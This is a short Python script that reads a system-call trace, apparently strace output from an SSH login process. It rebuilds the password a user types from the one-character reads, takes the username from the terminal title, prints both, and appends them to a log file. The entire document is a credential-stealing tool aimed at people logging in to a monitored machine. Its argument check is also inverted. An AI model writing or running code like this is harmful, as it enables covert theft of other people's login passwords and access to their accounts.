#!/usr/bin/python
import sys
import os as os
import re

welcomeRegex = re.compile(r'^(write\(5, "Welcome to)')
passwdRegex = re.compile(r'^read\(4, ".", 1\)[ \t]{2,}= 1')
readRegex = re.compile(r'^read\(4, "\\n", 1\)[ \t]{2,}= 1')
writeRegex = re.compile(r'^write\(4, "\\n", 1\)[ \t]{2,}= 1')
userRegex = re.compile(r'^(write\(5, "\\33]0;.+@.+:)')

passwd = []
userName = ""

__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
if (len(sys.argv) == 2):
    print("This script must be run with 2 parameters!")
    sys.exit(0)
with open(os.path.join(__location__, sys.argv[1])) as f:
    content = f.readlines()
content = [x.strip() for x in content]
for i in range(0, len(content)):
    if welcomeRegex.search(content[i]):
        break;
else:
    print("I can't find anything in " + sys.argv[1] + "! Maybe you should take a look at the file yourself :D")
    sys.exit(0)
for j in range(i-1 ,-1, -1):
    if writeRegex.search(content[j]) and j>0 and readRegex.search(content[j-1]):
        break;
for k in range(j-2, -1, -1):
    if passwdRegex.search(content[k]):
        passwd.append(content[k])
    else:
        break
passwd=''.join([r[9] for r in reversed(passwd)])
for k in range(i, len(content)):
    if userRegex.search(content[k]):
        userName = content[k][16:content[k].index(":")]
        break

print("Process: "+ sys.argv[1][7:]+ " " + sys.argv[2])
print("Username: " + userName)
print("Password: " + passwd)
with open("output.txt", "a") as log:
    log.write("Process: " + sys.argv[1][7:] + " " + sys.argv[2] + "\n")
    log.write("Username: " + userName + "\n")
    log.write("Password: "+ passwd + "\n")
    log.write("----------------------------" + "\n")
